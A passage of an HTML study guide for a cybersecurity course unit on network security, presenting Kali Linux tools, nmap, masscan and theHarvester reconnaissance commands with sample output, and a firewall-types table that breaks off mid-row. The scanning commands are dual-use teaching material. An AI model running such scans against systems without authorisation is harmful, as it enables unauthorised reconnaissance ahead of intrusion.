@@ -1,0 +1,1818 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Unit 6: Network Security — Complete Study Guide with Kali Linux</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Share+Tech+Mono&family=Nunito:wght@400;600;700;800&family=Exo+2:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --bg:#020810;
+  --bg-card:#050f1e;
+  --bg-panel:#07162a;
+  --blue:#0080ff;
+  --blue2:#0055cc;
+  --cyan:#00e5ff;
+  --electric:#00ff88;
+  --orange:#ff8800;
+  --red:#ff3355;
+  --purple:#9966ff;
+  --yellow:#ffdd00;
+  --text:#d0e8ff;
+  --dim:#2a4a6a;
+  --border:rgba(0,229,255,0.15);
+  --glow:0 0 22px rgba(0,229,255,0.3);
+  --glow-green:0 0 18px rgba(0,255,136,0.28);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:'Nunito',sans-serif;overflow-x:hidden;}
+body::before{content:'';position:fixed;inset:0;
+  background:radial-gradient(ellipse at 15% 30%,rgba(0,128,255,0.07) 0%,transparent 50%),
+             radial-gradient(ellipse at 85% 70%,rgba(0,255,136,0.05) 0%,transparent 50%);
+  pointer-events:none;z-index:0;}
+body::after{content:'';position:fixed;inset:0;
+  background-image:
+    repeating-linear-gradient(0deg,transparent,transparent 39px,rgba(0,229,255,0.03) 40px),
+    repeating-linear-gradient(90deg,transparent,transparent 39px,rgba(0,229,255,0.03) 40px);
+  pointer-events:none;z-index:0;}
+canvas#bg{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.25;}
+
+/* HEADER */
+header{position:relative;z-index:10;text-align:center;padding:58px 20px 42px;
+  background:linear-gradient(180deg,rgba(2,8,16,0.98) 0%,transparent 100%);
+  border-bottom:1px solid var(--border);}
+.ubadge{display:inline-flex;align-items:center;gap:8px;font-family:'Share Tech Mono',monospace;
+  font-size:.7rem;letter-spacing:4px;text-transform:uppercase;color:var(--cyan);
+  border:1px solid rgba(0,229,255,0.35);padding:6px 18px;border-radius:2px;
+  margin-bottom:20px;box-shadow:var(--glow);}
+header h1{font-family:'Orbitron',monospace;font-size:clamp(1.9rem,5vw,3.8rem);font-weight:900;
+  background:linear-gradient(135deg,var(--blue) 0%,var(--cyan) 40%,var(--electric) 70%,var(--yellow) 100%);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+  line-height:1.12;margin-bottom:8px;letter-spacing:2px;}
+header p.sub{font-family:'Share Tech Mono',monospace;color:var(--dim);font-size:.88rem;letter-spacing:3px;}
+.kali-badge{display:inline-flex;align-items:center;gap:8px;margin-top:12px;
+  background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.3);
+  padding:6px 16px;border-radius:4px;font-family:'Share Tech Mono',monospace;font-size:.75rem;
+  color:var(--electric);letter-spacing:2px;}
+.hstats{display:flex;justify-content:center;gap:18px;margin-top:22px;flex-wrap:wrap;}
+.hs{background:rgba(0,229,255,0.06);border:1px solid var(--border);border-radius:8px;padding:11px 18px;text-align:center;}
+.hs .n{font-family:'Orbitron',monospace;font-size:1.4rem;color:var(--cyan);}
+.hs .l{font-size:.67rem;color:var(--dim);letter-spacing:2px;text-transform:uppercase;margin-top:2px;}
+
+/* LAYOUT */
+.wrap{max-width:1200px;margin:0 auto;padding:0 20px;position:relative;z-index:5;}
+
+/* KALI OVERVIEW BOX */
+.kali-overview{background:#020c08;border:2px solid rgba(0,255,136,0.3);border-radius:14px;
+  padding:24px 28px;margin:20px 0 32px;position:relative;overflow:hidden;}
+.kali-overview::before{content:'KALI LINUX';position:absolute;right:20px;top:12px;
+  font-family:'Orbitron',monospace;font-size:.65rem;letter-spacing:4px;color:rgba(0,255,136,0.2);}
+.kali-title{font-family:'Orbitron',monospace;font-size:1.1rem;font-weight:700;
+  color:var(--electric);margin-bottom:16px;display:flex;align-items:center;gap:10px;}
+.kali-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px;}
+.kali-tool{background:rgba(0,255,136,0.06);border:1px solid rgba(0,255,136,0.2);
+  border-radius:8px;padding:12px 14px;}
+.kt-name{font-family:'Share Tech Mono',monospace;font-size:.85rem;font-weight:700;
+  color:var(--electric);margin-bottom:4px;}
+.kt-cat{font-family:'Share Tech Mono',monospace;font-size:.62rem;letter-spacing:2px;
+  color:rgba(0,255,136,0.5);margin-bottom:6px;text-transform:uppercase;}
+.kt-desc{font-size:.79rem;color:#7aaa88;line-height:1.5;}
+
+/* TOC */
+.toc-g{display:grid;grid-template-columns:repeat(auto-fill,minmax(235px,1fr));gap:8px;margin:14px 0 26px;}
+.ti{display:flex;align-items:center;gap:10px;background:var(--bg-card);border:1px solid var(--border);
+  border-radius:8px;padding:10px 14px;text-decoration:none;color:var(--text);transition:all .3s;cursor:pointer;}
+.ti:hover{border-color:var(--cyan);background:rgba(0,229,255,0.08);transform:translateX(4px);box-shadow:var(--glow);}
+.tn{font-family:'Share Tech Mono',monospace;font-size:.74rem;color:var(--orange);min-width:26px;}
+.tt{font-size:.86rem;font-weight:600;}
+
+/* SECTIONS */
+.sec{margin:30px 0;background:var(--bg-card);border:1px solid var(--border);border-radius:16px;overflow:hidden;position:relative;}
+.sec::before{content:'';position:absolute;left:0;top:0;bottom:0;width:4px;background:linear-gradient(180deg,var(--cyan),var(--electric));}
+.sh{padding:22px 26px 16px 34px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px;flex-wrap:wrap;}
+.sn{font-family:'Share Tech Mono',monospace;font-size:.78rem;color:var(--orange);
+  background:rgba(255,136,0,0.1);border:1px solid rgba(255,136,0,0.28);padding:4px 10px;border-radius:4px;white-space:nowrap;}
+.sh h2{font-family:'Exo 2',sans-serif;font-size:clamp(1.2rem,2.8vw,1.75rem);font-weight:800;color:var(--cyan);letter-spacing:.5px;}
+.se{font-size:1.6rem;margin-left:auto;}
+.sb{padding:22px 26px 26px 34px;}
+
+/* SUBSECTIONS */
+.sub{margin-bottom:22px;}
+.sub h3{font-family:'Exo 2',sans-serif;font-size:1.05rem;font-weight:700;color:var(--electric);
+  letter-spacing:.5px;margin-bottom:9px;display:flex;align-items:center;gap:8px;}
+.sub h3::before{content:'⟫';color:var(--orange);font-size:.85rem;}
+p{line-height:1.72;color:#90b8d8;margin-bottom:8px;font-size:.94rem;}
+strong{color:var(--yellow);font-weight:700;}
+
+/* DEF */
+.def{background:rgba(0,229,255,0.06);border:1px solid rgba(0,229,255,0.22);
+  border-left:3px solid var(--cyan);border-radius:8px;padding:13px 17px;margin:10px 0;font-size:.92rem;line-height:1.7;}
+.dl{font-family:'Share Tech Mono',monospace;font-size:.65rem;font-weight:700;
+  letter-spacing:3px;color:var(--cyan);text-transform:uppercase;margin-bottom:5px;}
+
+/* KALI TERMINAL */
+.terminal{background:#000d06;border:1px solid rgba(0,255,136,0.3);border-radius:10px;
+  margin:12px 0;overflow:hidden;}
+.term-header{background:rgba(0,255,136,0.08);padding:8px 14px;display:flex;align-items:center;gap:8px;
+  border-bottom:1px solid rgba(0,255,136,0.2);}
+.term-dots{display:flex;gap:5px;}
+.term-dots span{width:10px;height:10px;border-radius:50%;}
+.term-dots .r{background:#ff5f56;}
+.term-dots .y{background:#ffbd2e;}
+.term-dots .g{background:#27c93f;}
+.term-title{font-family:'Share Tech Mono',monospace;font-size:.68rem;color:rgba(0,255,136,0.5);
+  letter-spacing:2px;margin-left:6px;text-transform:uppercase;}
+.term-body{padding:16px 18px;overflow-x:auto;}
+.term-body pre{font-family:'Share Tech Mono',monospace;font-size:.78rem;line-height:1.8;white-space:pre;}
+.prompt{color:#00ff88;}
+.cmd{color:#ffffff;}
+.out{color:#7aaa88;}
+.err{color:#ff5566;}
+.flag{color:#ffdd00;}
+.ip{color:#00e5ff;}
+.comment{color:#2a5a3a;}
+.highlight{color:#ff8800;}
+
+/* TABLES */
+.tw{overflow-x:auto;margin:12px 0;border-radius:10px;border:1px solid var(--border);}
+table{width:100%;border-collapse:collapse;font-size:.84rem;}
+thead{background:linear-gradient(90deg,rgba(0,229,255,0.13),rgba(0,255,136,0.07));}
+thead th{padding:10px 13px;text-align:left;font-family:'Share Tech Mono',monospace;
+  font-size:.7rem;font-weight:700;letter-spacing:2px;color:var(--electric);
+  text-transform:uppercase;border-bottom:1px solid var(--border);white-space:nowrap;}
+tbody tr{border-bottom:1px solid rgba(0,229,255,0.06);transition:background .2s;}
+tbody tr:hover{background:rgba(0,229,255,0.05);}
+tbody td{padding:9px 13px;color:#90b8d8;vertical-align:top;line-height:1.5;}
+tbody td:first-child{color:var(--yellow);font-weight:700;}
+
+/* REGULAR CODE */
+.cb{background:#020c18;border:1px solid rgba(0,229,255,0.18);border-radius:10px;
+  padding:16px;margin:10px 0;overflow-x:auto;position:relative;}
+.clbl{position:absolute;top:6px;right:10px;font-family:'Share Tech Mono',monospace;
+  font-size:.6rem;letter-spacing:2px;color:var(--cyan);opacity:.55;text-transform:uppercase;}
+.cb pre{font-family:'Share Tech Mono',monospace;font-size:.77rem;line-height:1.7;color:#90b8d8;white-space:pre;}
+.cg{color:#00ff88;}.cy{color:#ffdd00;}.co{color:#ff8800;}.ci{color:#00e5ff;}
+.cp{color:#cc88ff;}.cr{color:#ff3355;}.cd{color:#1a3a5a;}.cw{color:#d0e8ff;}
+
+/* CARDS */
+.cg2{display:grid;grid-template-columns:repeat(auto-fill,minmax(175px,1fr));gap:11px;margin:12px 0;}
+.card{background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;padding:14px;transition:all .3s;}
+.card:hover{border-color:var(--cyan);transform:translateY(-3px);box-shadow:var(--glow);}
+.ci2{font-size:1.55rem;margin-bottom:7px;}
+.ct{font-family:'Exo 2',sans-serif;font-size:.9rem;font-weight:700;color:var(--electric);margin-bottom:4px;}
+.cd2{font-size:.79rem;color:var(--dim);line-height:1.5;}
+
+/* FLOW */
+.flow{margin:12px 0;display:flex;flex-direction:column;align-items:center;}
+.fn{background:rgba(0,229,255,0.07);border:1.5px solid var(--cyan);border-radius:8px;
+  padding:10px 20px;font-family:'Exo 2',sans-serif;font-size:.9rem;font-weight:700;
+  color:var(--text);text-align:center;min-width:200px;max-width:520px;width:100%;transition:all .3s;}
+.fn:hover{background:rgba(0,229,255,0.15);box-shadow:var(--glow);}
+.fn.s{background:rgba(0,255,136,0.08);border-color:var(--electric);border-radius:50px;color:var(--electric);}
+.fn.e{background:rgba(255,51,85,0.08);border-color:var(--red);border-radius:50px;color:var(--red);}
+.fn.w{background:rgba(255,136,0,0.08);border-color:var(--orange);color:var(--orange);}
+.fa{display:flex;flex-direction:column;align-items:center;margin:2px 0;}
+.fa .ln{width:2px;height:16px;background:var(--cyan);opacity:.3;}
+.fa .tip{width:0;height:0;border-left:6px solid transparent;border-right:6px solid transparent;border-top:8px solid var(--cyan);opacity:.3;}
+
+/* HORIZ FLOW */
+.flowh{display:flex;align-items:center;flex-wrap:wrap;justify-content:center;gap:4px;margin:11px 0;}
+.fnh{background:rgba(0,229,255,0.07);border:1px solid var(--cyan);border-radius:7px;
+  padding:8px 12px;font-size:.78rem;font-weight:700;text-align:center;color:var(--text);
+  font-family:'Exo 2',sans-serif;white-space:nowrap;}
+.fah{color:var(--cyan);font-size:1.1rem;padding:0 3px;opacity:.6;}
+
+/* COMPARE */
+.cmp{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:12px 0;}
+.cp2{background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;padding:14px;}
+.cp2 h4{font-family:'Exo 2',sans-serif;font-size:.92rem;font-weight:700;
+  margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--border);}
+.cp2.c h4{color:var(--cyan);}
+.cp2.g h4{color:var(--electric);}
+.cp2.o h4{color:var(--orange);}
+.cp2.r h4{color:var(--red);}
+.cp2.p h4{color:var(--purple);}
+.cp2.y h4{color:var(--yellow);}
+.cp2 ul{list-style:none;padding:0;}
+.cp2 ul li{font-size:.81rem;color:#90b8d8;padding:4px 0;border-bottom:1px solid rgba(255,255,255,.04);
+  display:flex;gap:7px;line-height:1.5;}
+.cp2 ul li::before{content:'→';color:var(--dim);flex-shrink:0;}
+
+/* INFO */
+.ib{border-radius:10px;padding:12px 16px;margin:10px 0;display:flex;gap:11px;
+  align-items:flex-start;font-size:.86rem;line-height:1.65;}
+.ib.c{background:rgba(0,229,255,0.07);border:1px solid rgba(0,229,255,0.22);}
+.ib.g{background:rgba(0,255,136,0.07);border:1px solid rgba(0,255,136,0.22);color:#a0ffcc;}
+.ib.o{background:rgba(255,136,0,0.07);border:1px solid rgba(255,136,0,0.22);color:#ffc888;}
+.ib.r{background:rgba(255,51,85,0.07);border:1px solid rgba(255,51,85,0.22);color:#ffa8b4;}
+.ib.p{background:rgba(153,102,255,0.07);border:1px solid rgba(153,102,255,0.22);color:#ccbbff;}
+.bi{font-size:1.2rem;flex-shrink:0;margin-top:2px;}
+
+/* EXERCISE */
+.ex{background:rgba(0,255,136,0.05);border:1px solid rgba(0,255,136,0.2);
+  border-radius:10px;padding:14px 17px;margin:12px 0;}
+.el{font-family:'Share Tech Mono',monospace;font-size:.65rem;font-weight:700;
+  letter-spacing:3px;color:var(--electric);text-transform:uppercase;margin-bottom:8px;display:flex;align-items:center;gap:7px;}
+.ex ol{padding-left:18px;}
+.ex ol li{font-size:.84rem;color:#90b8d8;margin-bottom:7px;line-height:1.6;}
+
+/* CONCL */
+.concl{margin-top:20px;background:linear-gradient(135deg,rgba(0,229,255,0.06),rgba(0,255,136,0.04));
+  border:1px solid rgba(0,229,255,0.18);border-radius:10px;padding:14px 18px;}
+.cl{font-family:'Share Tech Mono',monospace;font-size:.65rem;letter-spacing:3px;
+  color:var(--cyan);text-transform:uppercase;margin-bottom:6px;}
+
+/* SGT */
+.sgt{font-family:'Share Tech Mono',monospace;font-size:.7rem;font-weight:700;letter-spacing:4px;
+  color:var(--dim);text-transform:uppercase;padding:24px 0 10px;display:flex;align-items:center;gap:12px;}
+.sgt::after{content:'';flex:1;height:1px;background:var(--border);}
+.div{height:1px;background:linear-gradient(90deg,transparent,var(--cyan),transparent);margin:7px 0 20px;opacity:.2;}
+
+/* BADGES */
+.badge{display:inline-flex;align-items:center;gap:4px;font-family:'Share Tech Mono',monospace;
+  font-size:.62rem;padding:2px 9px;border-radius:3px;margin-left:6px;letter-spacing:1px;}
+.b-red{background:rgba(255,51,85,0.13);color:var(--red);border:1px solid rgba(255,51,85,0.3);}
+.b-orange{background:rgba(255,136,0,0.12);color:var(--orange);border:1px solid rgba(255,136,0,0.3);}
+.b-cyan{background:rgba(0,229,255,0.1);color:var(--cyan);border:1px solid rgba(0,229,255,0.25);}
+.b-green{background:rgba(0,255,136,0.1);color:var(--electric);border:1px solid rgba(0,255,136,0.25);}
+
+/* REVISION */
+.rv{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:8px;margin:12px 0;}
+.ri{background:var(--bg-panel);border:1px solid var(--border);border-radius:8px;padding:10px 13px;display:flex;gap:10px;}
+.rt{font-family:'Share Tech Mono',monospace;font-size:.69rem;font-weight:700;color:var(--orange);min-width:105px;padding-top:1px;}
+.rd{font-size:.79rem;color:#406080;line-height:1.5;}
+
+/* PILLS */
+.pills{display:flex;flex-wrap:wrap;gap:7px;margin:11px 0;}
+.pill{font-family:'Exo 2',sans-serif;font-size:.8rem;font-weight:700;padding:4px 13px;
+  border-radius:20px;background:rgba(0,229,255,0.08);border:1px solid rgba(0,229,255,0.2);color:var(--cyan);}
+.pill.g{background:rgba(0,255,136,0.08);border-color:rgba(0,255,136,0.2);color:var(--electric);}
+.pill.o{background:rgba(255,136,0,0.08);border-color:rgba(255,136,0,0.2);color:var(--orange);}
+.pill.r{background:rgba(255,51,85,0.08);border-color:rgba(255,51,85,0.2);color:var(--red);}
+.pill.p{background:rgba(153,102,255,0.08);border-color:rgba(153,102,255,0.2);color:var(--purple);}
+
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:rgba(0,229,255,.25);border-radius:3px;}
+@media(max-width:640px){.sb,.sh{padding-left:18px;padding-right:14px;}.cmp{grid-template-columns:1fr;}}
+</style>
+</head>
+<body>
+<canvas id="bg"></canvas>
+
+<header>
+  <div class="ubadge">🛡️ Cybersecurity Course · Unit 6</div>
+  <h1>Network Security</h1>
+  <p class="sub">// TOPICS 89 — 108 · COMPLETE STUDY GUIDE</p>
+  <div class="kali-badge">🐉 Includes Full Kali Linux Commands &amp; Tool Walkthroughs</div>
+  <div class="hstats">
+    <div class="hs"><div class="n">20</div><div class="l">Topics</div></div>
+    <div class="hs"><div class="n">30+</div><div class="l">Kali Tools</div></div>
+    <div class="hs"><div class="n">NGFW</div><div class="l">Firewalls</div></div>
+    <div class="hs"><div class="n">IDS/IPS</div><div class="l">Detection</div></div>
+    <div class="hs"><div class="n">Zero<br>Trust</div><div class="l">Architecture</div></div>
+  </div>
+</header>
+
+<div class="wrap">
+
+<!-- KALI LINUX OVERVIEW -->
+<div class="sgt">🐉 Kali Linux Overview</div>
+<div class="kali-overview">
+  <div class="kali-title">🐉 Kali Linux — The Penetration Tester's OS</div>
+  <div class="terminal">
+    <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">KALI LINUX OVERVIEW</div></div>
+    <div class="term-body"><pre><span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">uname -a</span>
+<span class="out">Linux kali 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 x86_64 GNU/Linux</span>
+
+<span class="comment"># Kali Linux is a Debian-based distro built for penetration testing</span>
+<span class="comment"># Developed by Offensive Security | Based on Debian Testing</span>
+<span class="comment"># Ships with 600+ pre-installed security tools</span>
+
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">kali-undercover</span>   <span class="comment"># Makes Kali look like Windows (for stealthy work)</span>
+
+<span class="comment"># Key Kali Editions:</span>
+<span class="out">Kali Linux (standard)  — Full install with all tools</span>
+<span class="out">Kali NetHunter          — Android penetration testing</span>
+<span class="out">Kali Purple             — Defensive/blue team edition</span>
+<span class="out">Kali Everywhere         — WSL2, Docker, cloud VMs</span>
+
+<span class="comment"># Tool categories in Kali:</span>
+<span class="flag">01 Information Gathering</span> <span class="comment">— nmap, maltego, recon-ng, theHarvester</span>
+<span class="flag">02 Vulnerability Analysis</span> <span class="comment">— nikto, OpenVAS, nessus</span>
+<span class="flag">03 Web Application</span>        <span class="comment">— burpsuite, OWASP ZAP, sqlmap, dirb</span>
+<span class="flag">04 Password Attacks</span>        <span class="comment">— hashcat, john, hydra, medusa</span>
+<span class="flag">05 Wireless Attacks</span>        <span class="comment">— aircrack-ng, wifite, kismet</span>
+<span class="flag">06 Exploitation Tools</span>      <span class="comment">— metasploit, msfvenom, searchsploit</span>
+<span class="flag">07 Sniffing &amp; Spoofing</span>     <span class="comment">— wireshark, tcpdump, ettercap, arpspoof</span>
+<span class="flag">08 Post Exploitation</span>       <span class="comment">— mimikatz, BloodHound, empire</span>
+<span class="flag">09 Forensics</span>               <span class="comment">— autopsy, volatility, binwalk</span>
+<span class="flag">10 Reporting</span>               <span class="comment">— dradis, faraday, CherryTree</span></pre></div>
+  </div>
+  <div class="kali-grid">
+    <div class="kali-tool"><div class="kt-name">nmap</div><div class="kt-cat">Network Scanning</div><div class="kt-desc">Port scanning, service detection, OS fingerprinting. The most used network reconnaissance tool.</div></div>
+    <div class="kali-tool"><div class="kt-name">Wireshark</div><div class="kt-cat">Packet Analysis</div><div class="kt-desc">GUI packet capture and protocol analyser. Decode hundreds of protocols in real-time.</div></div>
+    <div class="kali-tool"><div class="kt-name">Metasploit</div><div class="kt-cat">Exploitation</div><div class="kt-desc">World's most used exploitation framework. 2000+ exploits, payloads, auxiliary modules.</div></div>
+    <div class="kali-tool"><div class="kt-name">Aircrack-ng</div><div class="kt-cat">Wireless Attacks</div><div class="kt-desc">WiFi password cracking, packet injection, WPA2 4-way handshake capture and crack.</div></div>
+    <div class="kali-tool"><div class="kt-name">Hydra</div><div class="kt-cat">Password Attacks</div><div class="kt-desc">Fast network login cracker. Supports 50+ protocols: SSH, FTP, RDP, HTTP, SMB.</div></div>
+    <div class="kali-tool"><div class="kt-name">Burp Suite</div><div class="kt-cat">Web App Testing</div><div class="kt-desc">Web application proxy for intercepting, modifying HTTP requests. XSS, SQLi testing.</div></div>
+    <div class="kali-tool"><div class="kt-name">tcpdump</div><div class="kt-cat">CLI Packet Capture</div><div class="kt-desc">Command-line packet capture. Lightweight, powerful. Saves to .pcap for Wireshark analysis.</div></div>
+    <div class="kali-tool"><div class="kt-name">Hashcat</div><div class="kt-cat">Password Cracking</div><div class="kt-desc">World's fastest CPU/GPU password recovery. Supports MD5, SHA, bcrypt, NTLM, WPA2.</div></div>
+  </div>
+</div>
+
+<!-- TOC -->
+<div class="sgt">📋 Table of Contents</div>
+<div class="toc-g">
+  <a href="#t89" class="ti"><span class="tn">89</span><span class="tt">Network Security Basics</span></a>
+  <a href="#t90" class="ti"><span class="tn">90</span><span class="tt">Firewalls</span></a>
+  <a href="#t91" class="ti"><span class="tn">91</span><span class="tt">IDS — Intrusion Detection</span></a>
+  <a href="#t92" class="ti"><span class="tn">92</span><span class="tt">IPS — Intrusion Prevention</span></a>
+  <a href="#t93" class="ti"><span class="tn">93</span><span class="tt">VPN</span></a>
+  <a href="#t94" class="ti"><span class="tn">94</span><span class="tt">Packet Sniffing</span></a>
+  <a href="#t95" class="ti"><span class="tn">95</span><span class="tt">Network Monitoring</span></a>
+  <a href="#t96" class="ti"><span class="tn">96</span><span class="tt">Network Attacks</span></a>
+  <a href="#t97" class="ti"><span class="tn">97</span><span class="tt">DoS &amp; DDoS</span></a>
+  <a href="#t98" class="ti"><span class="tn">98</span><span class="tt">Man-in-the-Middle Attack</span></a>
+  <a href="#t99" class="ti"><span class="tn">99</span><span class="tt">ARP Spoofing</span></a>
+  <a href="#t100" class="ti"><span class="tn">100</span><span class="tt">DNS Spoofing</span></a>
+  <a href="#t101" class="ti"><span class="tn">101</span><span class="tt">Network Segmentation 🔥</span></a>
+  <a href="#t102" class="ti"><span class="tn">102</span><span class="tt">Zero Trust Security 🔥</span></a>
+  <a href="#t103" class="ti"><span class="tn">103</span><span class="tt">Endpoint Security (EDR) 🔥</span></a>
+  <a href="#t104" class="ti"><span class="tn">104</span><span class="tt">Secure Network Design</span></a>
+  <a href="#t105" class="ti"><span class="tn">105</span><span class="tt">Case Study</span></a>
+  <a href="#t106" class="ti"><span class="tn">106</span><span class="tt">Best Practices</span></a>
+  <a href="#t107" class="ti"><span class="tn">107</span><span class="tt">Kali Linux Lab Guide</span></a>
+  <a href="#t108" class="ti"><span class="tn">108</span><span class="tt">Unit 6 Revision Notes</span></a>
+</div>
+
+<!-- ===== T89 ===== -->
+<div class="sgt">🛡️ Foundations</div>
+<div class="sec" id="t89">
+  <div class="sh"><span class="sn">Topic 89</span><h2>Network Security Basics</h2><span class="se">🛡️</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition &amp; Core Principles</h3>
+      <div class="def"><div class="dl">Definition</div>
+        <strong>Network security</strong> is the practice of protecting the usability, integrity, and safety of a network and its data by implementing hardware and software solutions that prevent unauthorised access, misuse, modification, or denial of the network and its resources.
+      </div>
+    </div>
+    <div class="sub"><h3>CIA Triad Applied to Networks</h3>
+      <div class="cg2">
+        <div class="card"><div class="ci2">🔒</div><div class="ct">Confidentiality</div><div class="cd2">Prevent unauthorised reading of network traffic. TLS, VPN, network encryption.</div></div>
+        <div class="card"><div class="ci2">✅</div><div class="ct">Integrity</div><div class="cd2">Ensure traffic is not tampered with in transit. IPSec, HMAC, digital signatures.</div></div>
+        <div class="card"><div class="ci2">⚡</div><div class="ct">Availability</div><div class="cd2">Ensure network services remain accessible. Anti-DDoS, redundancy, QoS, rate limiting.</div></div>
+        <div class="card"><div class="ci2">🪪</div><div class="ct">Authentication</div><div class="cd2">Verify identity of devices and users. 802.1X, MFA, certificates, RADIUS.</div></div>
+        <div class="card"><div class="ci2">🎯</div><div class="ct">Authorisation</div><div class="cd2">Control what authenticated users can access. ACLs, firewall rules, VLANs, RBAC.</div></div>
+        <div class="card"><div class="ci2">📋</div><div class="ct">Non-repudiation</div><div class="cd2">Audit logs prove who did what, when. SIEM, logging, network flow records.</div></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Kali Linux — Basic Recon Commands</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">KALI — NETWORK RECONNAISSANCE</div></div>
+        <div class="term-body"><pre><span class="comment"># ── Discover your own network ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ip addr show</span>                    <span class="comment"># Show all interfaces and IPs</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ip route show</span>                   <span class="comment"># Routing table</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">arp -a</span>                          <span class="comment"># ARP cache — known IP:MAC mappings</span>
+
+<span class="comment"># ── nmap: The master port scanner ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="ip">192.168.1.0/24</span></span>          <span class="comment"># Discover all hosts on subnet</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="flag">-sV -sC</span> <span class="ip">192.168.1.1</span></span>     <span class="comment"># Service version + default scripts</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="flag">-A -T4 -p-</span> <span class="ip">10.10.10.5</span></span>  <span class="comment"># Aggressive scan, all 65535 ports</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="flag">-sS -O</span> <span class="ip">192.168.1.1</span></span>     <span class="comment"># SYN stealth scan + OS detection</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="flag">--script vuln</span> <span class="ip">192.168.1.100</span></span> <span class="comment"># Scan for known CVEs</span>
+<span class="out">
+Starting Nmap 7.94 at 2024-01-15 10:23 GMT
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu
+80/tcp   open  http        Apache httpd 2.4.52
+443/tcp  open  https       Apache httpd 2.4.52
+3306/tcp open  mysql       MySQL 8.0.32
+OS: Linux 5.x</span>
+
+<span class="comment"># ── Other useful recon tools ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">netdiscover <span class="flag">-r</span> <span class="ip">192.168.1.0/24</span></span>  <span class="comment"># ARP discovery (passive)</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">masscan <span class="ip">10.0.0.0/8</span> <span class="flag">-p 80,443</span> <span class="flag">--rate 10000</span></span> <span class="comment"># Ultra-fast scanner</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">whois example.com</span>              <span class="comment"># Domain ownership information</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">theHarvester <span class="flag">-d</span> example.com <span class="flag">-b</span> google</span> <span class="comment"># Email, subdomain OSINT</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Run <code>nmap -sV 192.168.1.1</code> on your home router (with permission). What services are exposed? Are any dangerous?</li>
+      <li>What is the difference between an <code>nmap -sS</code> (SYN scan) and <code>-sT</code> (TCP connect scan)? Which is more stealthy?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Network security is not a product you buy — it's a process you implement. Attackers use tools like nmap to understand your network before attacking it. Defenders should use the same tools to understand their own exposure first. "Know your network better than your attacker does."</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T90 ===== -->
+<div class="sec" id="t90">
+  <div class="sh"><span class="sn">Topic 90</span><h2>Firewalls</h2><span class="se">🔥</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Firewall Types</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Type</th><th>OSI Layer</th><th>How It Works</th><th>Example</th><th>Weakness</th></tr></thead>
+        <tbody>
+          <tr><td>Packet Filter</td><td>L3/L4</td><td>Allow/deny by src IP, dst IP, port, protocol. Stateless.</td><td>iptables (basic rules), ACLs on routers</td><td>Doesn't track connection state; easy to bypass</td></tr>
+          <tr><td>Stateful Firewall</td><td>L3/L4</td><td>Tracks connection state (established/related). Only allows responses to initiated connections.</td><td>iptables -m state, Windows Firewall</td><td>Blind to application-layer attacks (port 443 = always allowed)</td></tr>
+          <tr><td>Application FW / Proxy</td><td>L7</td><td>Understands application protocols. Can block specific apps, not just ports.</td><td>Squid proxy, Blue Coat</td><td>Performance overhead; limited protocol support</td></tr>
+          <tr><td>NGFW (Next-Gen)</td><td>L3–L7</td><td>Deep Packet Inspection (DPI), App-ID, User-ID, SSL inspection, threat intelligence.</td><td>Palo Alto, Fortinet, Checkpoint</td><td>Cost; SSL inspection creates privacy concerns</td></tr>
